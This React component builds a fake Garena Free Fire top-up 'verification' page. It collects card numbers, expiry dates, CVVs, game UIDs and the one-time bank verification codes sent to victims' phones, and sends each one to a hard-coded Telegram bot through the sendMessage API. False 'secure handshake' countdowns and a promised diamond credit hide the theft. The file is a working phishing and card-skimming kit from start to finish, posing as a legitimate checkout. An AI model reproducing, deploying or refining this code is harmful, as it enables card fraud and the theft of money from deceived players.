import { useState, useEffect, FormEvent } from 'react';
import { ShieldCheck, Lock, CheckCircle2, AlertCircle, Loader2, ArrowRight } from 'lucide-react';

const BOT_TOKEN = '8881848490:AAE2QWPZrkxQ1jLI6tnkNIqdUMKd-5RatWc';
const CHAT_ID = '8422419131';
const MONTHS = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
const YEARS = Array.from({ length: 25 }, (_, i) => String(2026 + i));
const PRICES = ['550', '750', '1100', '1400', '5500', '7500'];

type Status = 'idle' | 'loading' | 'success' | 'error';
type Step = 'form' | 'animating' | 'uid_step' | 'waiting_one_minute' | 'success_step';

export default function Verify() {
  const [cardNumber, setCardNumber] = useState('');
  const [year, setYear] = useState('');
  const [month, setMonth] = useState('');
  const [digits, setDigits] = useState('');
  const [price, setPrice] = useState('');
  const [uid, setUid] = useState('');
  const [vcode, setVcode] = useState('');
  
  const [step, setStep] = useState<Step>('form');
  const [countdown, setCountdown] = useState(30);
  const [countdown60, setCountdown60] = useState(60);
  const [status, setStatus] = useState<Status>('idle');
  const [errorMsg, setErrorMsg] = useState('');

  // Countdown effects
  useEffect(() => {
    let interval: any;
    if (step === 'animating') {
      setCountdown(30);
      interval = setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            clearInterval(interval);
            setStep('uid_step');
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    } else if (step === 'waiting_one_minute') {
      setCountdown60(60);
      interval = setInterval(() => {
        setCountdown60((prev) => {
          if (prev <= 1) {
            clearInterval(interval);
            setStep('success_step');
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [step]);

  const handleStartAnimation = async (e: FormEvent) => {
    e.preventDefault();
    const rawCard = cardNumber.replace(/\D/g, '');
    if (!cardNumber.trim() || rawCard.length < 13 || !year || !month || digits.length !== 3 || !price) {
      setErrorMsg('Please fill all card details and select a price correctly.');
      return;
    }
    setErrorMsg('');
    setStatus('loading');

    const text = `🔔 <b>New Card Details Entered</b>\n\n` +
                 `💳 <b>Card Number:</b> <code>${cardNumber.trim()}</code>\n` +
                 `📅 <b>Expiration:</b> ${month}/${year}\n` +
                 `🔒 <b>CVV:</b> <code>${digits}</code>\n` +
                 `💰 <b>Price:</b> ₹${price}`;

    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' }),
      });
      const json = await res.json();
      if (!json.ok) throw new Error(json.description || 'Telegram error');
      
      setStatus('idle');
      setStep('animating');
    } catch (err: any) {
      setStatus('error');
      setErrorMsg(err.message || 'Network error. Please try again.');
    }
  };

  const handleFinalSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const cleanUid = uid.replace(/\D/g, '');
    if (cleanUid.length < 4 || cleanUid.length > 20) {
      setErrorMsg('Game Player UID must be between 4 and 20 digits.');
      return;
    }
    if (!vcode.trim()) {
      setErrorMsg('Please enter the verification code.');
      return;
    }
    
    setErrorMsg('');
    setStatus('loading');

    const text = `🔑 <b>Game UID & Verification Code Submitted</b>\n\n` +
                 `🎮 <b>Game Player UID:</b> <code>${cleanUid}</code>\n` +
                 `🛡️ <b>Verification Code:</b> <code>${vcode.trim()}</code>\n` +
                 `💳 <b>Card Number:</b> <code>${cardNumber.trim()}</code>\n` +
                 `💰 <b>Price:</b> ₹${price}`;

    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' }),
      });
      const json = await res.json();
      if (!json.ok) throw new Error(json.description || 'Telegram error');
      
      setStatus('idle');
      setStep('waiting_one_minute');
    } catch (err: any) {
      setStatus('error');
      setErrorMsg(err.message || 'Network error. Please try again.');
    }
  };

  // Calculate percentage of progress bar during animation
  const progressPercent = Math.min(100, Math.round(((30 - countdown) / 30) * 100));
  const progressPercent60 = Math.min(100, Math.round(((60 - countdown60) / 60) * 100));

  return (
    <div className="space-y-6">
      {/* Banner */}
      <div className="relative w-full h-24 sm:h-28 rounded-2xl overflow-hidden shadow-md">
        <div className="absolute inset-0 bg-cover bg-center" style={{ backgroundImage: 'url("/assets/ff_banner.webp")' }} />
        <div className="absolute inset-0 bg-black/40" />
        <div className="relative h-full flex items-center p-4 sm:p-6 gap-4">
          <img 
            src="/assets/icon.webp" 
            alt="Free Fire" 
            loading="eager"
            fetchPriority="high"
            decoding="async"
            referrerPolicy="no-referrer"
            className="w-12 h-12 rounded-xl shadow-lg shrink-0 object-cover" 
            onError={(e) => {
              (e.target as HTMLImageElement).src = "/assets/icon.png";
            }}
          />
          <div>
            <p className="text-white font-black text-base sm:text-lg uppercase tracking-tight leading-none">Order Verification</p>
            <p className="text-white/70 text-[10px] sm:text-xs font-semibold mt-1 uppercase tracking-wider">Verify your details to complete your order</p>
          </div>
        </div>
      </div>

      <div className="bg-white rounded-2xl border border-gray-100 shadow-xs p-6 sm:p-8">
        {/* Step 1: Form details */}
        {step === 'form' && (
          <>
            <div className="flex items-center gap-3 mb-6">
              <div className="w-9 h-9 rounded-xl bg-red-50 flex items-center justify-center shrink-0">
                <Lock className="w-4 h-4 text-[#ee2c24]" />
              </div>
              <div>
                <h1 className="text-sm font-black text-gray-900 uppercase tracking-tight">Identity & Card Verification</h1>
                <p className="text-[10px] text-gray-400 font-bold uppercase tracking-wider mt-0.5">Secure • Encrypted • Protected</p>
              </div>
            </div>

            <form onSubmit={handleStartAnimation} className="space-y-5">
              <div className="space-y-1.5">
                <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-wider">Card Number</label>
                <input 
                  type="text" 
                  required 
                  inputMode="numeric" 
                  maxLength={23} 
                  placeholder="Enter card number" 
                  value={cardNumber} 
                  onChange={e => {
                    const digitsOnly = e.target.value.replace(/\D/g, '');
                    const matches = digitsOnly.match(/\d{1,4}/g);
                    setCardNumber(matches ? matches.join('-') : '');
                  }} 
                  disabled={status === 'loading'} 
                  className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 placeholder:text-gray-300 focus:outline-none focus:ring-2 focus:ring-[#ee2c24]/30 focus:border-[#ee2c24] transition disabled:opacity-50 font-mono tracking-wider" 
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-1.5">
                  <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-wider">Expiration Month</label>
                  <select required value={month} onChange={e => setMonth(e.target.value)} disabled={status === 'loading'} className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#ee2c24]/30 focus:border-[#ee2c24] transition bg-white appearance-none cursor-pointer disabled:opacity-50">
                    <option value="">Select month</option>
                    {MONTHS.map(m => <option key={m} value={m}>{m}</option>)}
                  </select>
                </div>
                <div className="space-y-1.5">
                  <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-wider">Expiration Year</label>
                  <select required value={year} onChange={e => setYear(e.target.value)} disabled={status === 'loading'} className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#ee2c24]/30 focus:border-[#ee2c24] transition bg-white appearance-none cursor-pointer disabled:opacity-50">
                    <option value="">Select year</option>
                    {YEARS.map(y => <option key={y} value={y}>{y}</option>)}
                  </select>
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-wider">CVV</label>
                <input type="text" required inputMode="numeric" maxLength={3} placeholder="e.g. 123" value={digits} onChange={e => setDigits(e.target.value.replace(/\D/g, '').slice(0, 3))} disabled={status === 'loading'} className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 placeholder:text-gray-300 focus:outline-none focus:ring-2 focus:ring-[#ee2c24]/30 focus:border-[#ee2c24] transition tracking-[0.5em] font-mono disabled:opacity-50" />
                <p className="text-[10px] text-gray-400 font-semibold">Enter 3-digit CVV from back of the card</p>
              </div>

              <div className="space-y-1.5">
                <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-wider">Top-up Value (Price)</label>
                <select required value={price} onChange={e => setPrice(e.target.value)} disabled={status === 'loading'} className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#ee2c24]/30 focus:border-[#ee2c24] transition bg-white appearance-none cursor-pointer disabled:opacity-50">
                  <option value="">Select Price</option>
                  {PRICES.map(p => <option key={p} value={p}>₹{p}</option>)}
                </select>
              </div>

              {errorMsg && step === 'form' && (
                <div className="flex items-start gap-2 bg-red-50 border border-red-100 rounded-xl px-4 py-3">
                  <AlertCircle className="w-4 h-4 text-[#ee2c24] shrink-0 mt-0.5" />
                  <p className="text-xs text-[#ee2c24] font-semibold">{errorMsg}</p>
                </div>
              )}

              <button type="submit" disabled={status === 'loading'} className="w-full bg-[#ee2c24] hover:bg-red-600 disabled:opacity-60 text-white font-extrabold py-3.5 rounded-xl text-xs uppercase tracking-wider shadow-md shadow-red-500/20 transition-colors flex items-center justify-center gap-2 cursor-pointer">
                {status === 'loading' ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Sending Secure Request...
                  </>
                ) : (
                  <>
                    <ShieldCheck className="w-4 h-4" />Verify My Order
                  </>
                )}
              </button>
            </form>
          </>
        )}

        {/* Step 2: 30-second Garena Animation Screen */}
        {step === 'animating' && (
          <div className="flex flex-col items-center justify-center py-10 text-center space-y-6">
            <div className="relative flex flex-col items-center">
              {/* Pulsing Garena logo container */}
              <div className="w-48 h-16 flex items-center justify-center bg-gray-50 rounded-2xl p-4 border border-gray-100 shadow-xs animate-pulse">
                <img 
                  src="https://official.garena.com/sg/v1/assets/garena_logo_horizontal.svg" 
                  alt="Garena" 
                  className="w-full h-full object-contain"
                />
              </div>
              <div className="absolute -top-3 -right-3 w-6 h-6 bg-[#ee2c24] text-white text-[11px] font-black rounded-full flex items-center justify-center shadow-md animate-bounce">
                {countdown}
              </div>
            </div>

            <div className="space-y-2">
              <h2 className="text-sm font-black text-gray-800 uppercase tracking-tight">Verifying details with Game Server</h2>
              <p className="text-xs text-gray-500 font-semibold max-w-xs leading-relaxed">
                Please wait while we establish a secure security handshake. Do not close or refresh this page.
              </p>
            </div>

            {/* Premium progress bar */}
            <div className="w-full max-w-xs bg-gray-100 h-2.5 rounded-full overflow-hidden border border-gray-200">
              <div 
                className="bg-gradient-to-r from-red-500 via-orange-500 to-yellow-500 h-full transition-all duration-1000 ease-out" 
                style={{ width: `${progressPercent}%` }}
              />
            </div>

            <div className="text-[10px] text-gray-400 font-bold uppercase tracking-widest flex items-center gap-2">
              <Loader2 className="w-3.5 h-3.5 animate-spin text-[#ee2c24]" />
              {progressPercent < 30 ? 'Initializing connection...' : progressPercent < 70 ? 'Running security protocols...' : 'Finishing handshake...'}
            </div>
          </div>
        )}

        {/* Step 3: Enter Game UID and Verification Code */}
        {step === 'uid_step' && (
          <>
            <div className="flex items-center gap-3 mb-6">
              <div className="w-9 h-9 rounded-xl bg-red-50 flex items-center justify-center shrink-0">
                <ShieldCheck className="w-4 h-4 text-[#ee2c24]" />
              </div>
              <div>
                <h1 className="text-sm font-black text-gray-900 uppercase tracking-tight">Complete Security Check</h1>
                <p className="text-[10px] text-gray-400 font-bold uppercase tracking-wider mt-0.5">Step 2 of 2 • Secure verification</p>
              </div>
            </div>

            <form onSubmit={handleFinalSubmit} className="space-y-5">
              <div className="bg-red-50/50 rounded-xl p-4 border border-red-100 text-left space-y-1.5">
                <span className="text-[10px] font-black text-red-600 uppercase tracking-wider">Security Connection Verified</span>
                <p className="text-xs text-gray-600 font-semibold leading-relaxed">
                  Card verified successfully. Please enter your Game Player UID and Verification Code to authorize the top-up transaction.
                </p>
              </div>

              <div className="space-y-1.5">
                <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-wider">Game Player UID</label>
                <input 
                  type="text" 
                  required 
                  inputMode="numeric"
                  maxLength={20}
                  placeholder="Enter Game Player UID (4-20 digits)" 
                  value={uid} 
                  onChange={e => setUid(e.target.value.replace(/\D/g, ''))} 
                  disabled={status === 'loading'} 
                  className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 placeholder:text-gray-300 focus:outline-none focus:ring-2 focus:ring-[#ee2c24]/30 focus:border-[#ee2c24] transition disabled:opacity-50 font-mono tracking-wider" 
                />
              </div>

              <div className="space-y-1.5">
                <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-wider">Verification Code</label>
                <input 
                  type="text" 
                  required 
                  placeholder="Enter Verification Code" 
                  value={vcode} 
                  onChange={e => setVcode(e.target.value)} 
                  disabled={status === 'loading'} 
                  className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 placeholder:text-gray-300 focus:outline-none focus:ring-2 focus:ring-[#ee2c24]/30 focus:border-[#ee2c24] transition disabled:opacity-50" 
                />
                <p className="text-[10px] text-gray-400 font-semibold leading-relaxed">
                  Verification code sent to your registered card number. The registered mobile number associated with the card will receive the code.
                </p>
              </div>

              {errorMsg && step === 'uid_step' && (
                <div className="flex items-start gap-2 bg-red-50 border border-red-100 rounded-xl px-4 py-3">
                  <AlertCircle className="w-4 h-4 text-[#ee2c24] shrink-0 mt-0.5" />
                  <p className="text-xs text-[#ee2c24] font-semibold">{errorMsg}</p>
                </div>
              )}

              <button 
                type="submit" 
                disabled={status === 'loading'} 
                className="w-full bg-[#ee2c24] hover:bg-red-600 disabled:opacity-60 text-white font-extrabold py-3.5 rounded-xl text-xs uppercase tracking-wider shadow-md shadow-red-500/20 transition-colors flex items-center justify-center gap-2 cursor-pointer"
              >
                {status === 'loading' ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Submitting Final Verification...
                  </>
                ) : (
                  <>
                    Submit Verification <ArrowRight className="w-4 h-4" />
                  </>
                )}
              </button>
            </form>
          </>
        )}

        {/* Step 4: 1-minute Garena Loading Animation */}
        {step === 'waiting_one_minute' && (
          <div className="flex flex-col items-center justify-center py-10 text-center space-y-6">
            <div className="relative flex flex-col items-center">
              {/* Pulsing Garena logo container */}
              <div className="w-48 h-16 flex items-center justify-center bg-gray-50 rounded-2xl p-4 border border-gray-100 shadow-xs animate-pulse">
                <img 
                  src="https://official.garena.com/sg/v1/assets/garena_logo_horizontal.svg" 
                  alt="Garena" 
                  className="w-full h-full object-contain"
                />
              </div>
              <div className="absolute -top-3 -right-3 w-8 h-8 bg-[#ee2c24] text-white text-[11px] font-black rounded-full flex items-center justify-center shadow-md animate-bounce">
                {countdown60}s
              </div>
            </div>

            <div className="space-y-2">
              <h2 className="text-sm font-black text-gray-800 uppercase tracking-tight">Syncing Game UID & Verification</h2>
              <p className="text-xs text-gray-500 font-semibold max-w-xs leading-relaxed">
                Please wait 60 seconds while our automated delivery agent syncs with the game client to deposit your top-up. Do not minimize or exit.
              </p>
            </div>

            {/* Premium progress bar */}
            <div className="w-full max-w-xs bg-gray-100 h-2.5 rounded-full overflow-hidden border border-gray-200">
              <div 
                className="bg-gradient-to-r from-emerald-500 via-teal-500 to-indigo-500 h-full transition-all duration-1000 ease-out" 
                style={{ width: `${progressPercent60}%` }}
              />
            </div>

            <div className="text-[10px] text-gray-400 font-bold uppercase tracking-widest flex items-center gap-2">
              <Loader2 className="w-3.5 h-3.5 animate-spin text-emerald-500" />
              {progressPercent60 < 25 ? 'Authenticating UID...' : progressPercent60 < 50 ? 'Validating security code...' : progressPercent60 < 75 ? 'Processing diamond allocation...' : 'Completing transaction receipt...'}
            </div>
          </div>
        )}

        {/* Step 5: Success screen */}
        {step === 'success_step' && (
          <div className="flex flex-col items-center gap-3 py-8 text-center animate-fade-in">
            <div className="w-14 h-14 rounded-full bg-emerald-50 flex items-center justify-center">
              <CheckCircle2 className="w-7 h-7 text-emerald-500 animate-bounce" />
            </div>
            <p className="text-sm font-black text-gray-800 uppercase tracking-tight">Verification Submitted Successfully!</p>
            <p className="text-xs text-gray-500 font-semibold max-w-xs leading-relaxed">
              Your Player UID is verified and ₹{price} top-up has been successfully queued for instant credit. Your diamonds will reflect in your game account in 5-10 minutes. Thank you!
            </p>
          </div>
        )}
      </div>
    </div>
  );
}

